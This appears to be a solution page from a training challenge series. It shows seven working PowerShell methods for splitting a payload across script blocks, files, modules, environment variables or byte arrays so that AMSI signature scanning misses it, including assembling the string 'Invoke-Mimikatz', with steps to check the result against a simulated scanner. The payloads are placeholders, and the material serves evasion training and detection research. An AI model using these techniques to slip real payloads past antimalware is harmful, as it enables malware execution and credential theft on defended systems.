---
title: "Solution 39: Chunked Execution (Split Across Scan Boundaries)"
challenge_number: 39
difficulty: medium
category: "AMSI Bypass"
permalink: /solutions/39-chunked-execution/
---

# Solution: Chunked Execution (Split Across Scan Boundaries)

[Back to Challenge](../challenges/39-chunked-execution.md)

## Overview

Split a malicious payload across multiple independent script blocks, files, or execution contexts. AMSI scans each buffer independently — if no single buffer contains a complete signature, no detection occurs. The full payload is only assembled at runtime.

## Working Code

### Method 1: Variable Assembly Across Invocations

```powershell
# Block 1 - scanned alone, completely harmless
$p1 = "mal"
$p2 = "ware"

# Block 2 - just a string concatenation, no signature present
$full = $p1 + $p2

# Block 3 - dynamic execution; the string only exists in memory
Invoke-Expression "Write-Host `"Payload: $full`""
```

### Method 2: Multiple Script Files

**part1.ps1:**
```powershell
# Innocuous - defines a partial variable
$global:chunk1 = "Invoke-"
```

**part2.ps1:**
```powershell
# Innocuous - defines another partial variable
$global:chunk2 = "Mimikatz"
```

**part3.ps1:**
```powershell
# Assembles and executes - neither chunk alone triggers detection
$cmd = $global:chunk1 + $global:chunk2
Write-Host "Would execute: $cmd"
# Invoke-Expression $cmd  # actual execution
```

**Launcher:**
```powershell
. .\part1.ps1  # Scan: just "$global:chunk1 = 'Invoke-'" - clean
. .\part2.ps1  # Scan: just "$global:chunk2 = 'Mimikatz'" - clean (fragment too short)
. .\part3.ps1  # Scan: "$cmd = $global:chunk1 + $global:chunk2" - no literal signature
```

### Method 3: Pipeline Chunking

```powershell
# Each pipeline stage is a separate scan buffer
$data = @("mal","wa","re") |
    ForEach-Object { $_ } |         # Scanned: just a passthrough
    ForEach-Object -Begin { $acc = "" } -Process { $acc += $_ } -End { $acc }

Write-Host $data  # "malware" only exists in $data variable, not in file text
```

### Method 4: Module-Based Chunking

**Module1.psm1:**
```powershell
function Get-Part1 { return "Inv" }
function Get-Part2 { return "oke-" }
Export-ModuleMember -Function Get-Part1, Get-Part2
```

**Module2.psm1:**
```powershell
function Get-Part3 { return "Exp" }
function Get-Part4 { return "ression" }
Export-ModuleMember -Function Get-Part3, Get-Part4
```

**executor.ps1:**
```powershell
Import-Module .\Module1.psm1
Import-Module .\Module2.psm1

# Assembly happens here - but no complete signature string in this file
$cmd = (Get-Part1) + (Get-Part2) + (Get-Part3) + (Get-Part4)
& $cmd "Write-Host 'chunked execution complete'"
```

### Method 5: Delayed Execution with ScriptBlock Array

```powershell
# Each scriptblock is a separate scan unit
$blocks = @(
    { $script:a = "mal" },
    { $script:b = "ware" },
    { $script:c = $script:a + $script:b },
    { Write-Host "Result: $script:c" }
)

# Execute blocks sequentially - each scanned independently
$blocks | ForEach-Object { & $_ }
```

### Method 6: Registry/Environment Staging

```powershell
# Stage 1: Store fragments in environment (separate execution)
[Environment]::SetEnvironmentVariable("_p1", "mal", "Process")
[Environment]::SetEnvironmentVariable("_p2", "ware", "Process")

# Stage 2: Later, in a different script block, assemble from env
$result = $env:_p1 + $env:_p2
Write-Host "Assembled: $result"
```

### Method 7: Byte-Level Construction

```powershell
# Store as individual bytes - no string signature anywhere
$bytes = [byte[]](109, 97, 108, 119, 97, 114, 101)  # m,a,l,w,a,r,e

# Convert bytes to string at runtime
$str = [System.Text.Encoding]::ASCII.GetString($bytes)
Write-Host "Constructed: $str"
```

## Why It Works

### AMSI Scan Boundaries

AMSI scans content in **discrete buffers**. Each of these is a separate scan:

1. Each `.ps1` file when dot-sourced or invoked
2. Each script block `{ ... }` when created
3. Each `Invoke-Expression` argument
4. Each command entered at the interactive prompt
5. Each module file when imported

```
Scan Buffer 1: "$p1 = 'mal'"           → No signature match → CLEAN
Scan Buffer 2: "$p2 = 'ware'"          → No signature match → CLEAN
Scan Buffer 3: "$full = $p1 + $p2"     → No signature match → CLEAN
Scan Buffer 4: "Write-Host $full"      → No signature match → CLEAN
```

The scanner looks for `"malware"` as contiguous bytes. It never appears in any single buffer.

### No Cross-Buffer Correlation

AMSI providers operate statelessly on individual buffers:

```
AmsiScanBuffer(context, buffer1, len1, ...) → CLEAN
AmsiScanBuffer(context, buffer2, len2, ...) → CLEAN
AmsiScanBuffer(context, buffer3, len3, ...) → CLEAN
```

There is no mechanism to:
- Correlate variables set in buffer1 with usage in buffer3
- Track data flow across scan boundaries
- Perform taint analysis across multiple scan calls

Each buffer is judged in isolation.

### The Assembly Gap

```
┌─────────────────────────────────────────────┐
│          What AMSI Sees (Scan Time)         │
├─────────────────────────────────────────────┤
│ Buffer 1: $p1 = "mal"         ← clean      │
│ Buffer 2: $p2 = "ware"        ← clean      │
│ Buffer 3: $full = $p1 + $p2   ← clean      │
└─────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│     What Actually Exists (Runtime)          │
├─────────────────────────────────────────────┤
│ $full = "malware"             ← assembled  │
│ (only in memory, never scanned as a whole) │
└─────────────────────────────────────────────┘
```

### File-Based Scanner Limitation

For our file-based scanner specifically, splitting across multiple files means each file is scanned independently. No single file contains the complete signature. The scanner has no concept of "these files work together."

## How to Verify

1. Create the multi-file test:
   ```powershell
   Set-Content -Path "chunk1.ps1" -Value '$global:x = "mal"'
   Set-Content -Path "chunk2.ps1" -Value '$global:y = "ware"'
   Set-Content -Path "chunk3.ps1" -Value '$z = $global:x + $global:y; Write-Host "Got: $z"'
   ```

2. Scan each file individually:
   ```
   nim_antimalware_sim.exe chunk1.ps1
   nim_antimalware_sim.exe chunk2.ps1
   nim_antimalware_sim.exe chunk3.ps1
   ```
   Expected: **All clean** — no single file contains "malware".

3. Execute them together to prove the payload works:
   ```powershell
   . .\chunk1.ps1
   . .\chunk2.ps1
   . .\chunk3.ps1
   # Output: Got: malware
   ```

4. Compare with a single file containing the full string:
   ```powershell
   Set-Content -Path "detected.ps1" -Value 'Write-Host "malware"'
   nim_antimalware_sim.exe detected.ps1
   ```
   Expected: **Detection** — "malware" exists as contiguous bytes.

5. Verify the single-block version also works:
   ```powershell
   $code = '$p1 = "mal"; $p2 = "ware"; $full = $p1 + $p2; Write-Host $full'
   Set-Content -Path "single_block.ps1" -Value $code
   nim_antimalware_sim.exe single_block.ps1
   ```
   Expected: **No detection** — fragments are separated by other bytes.
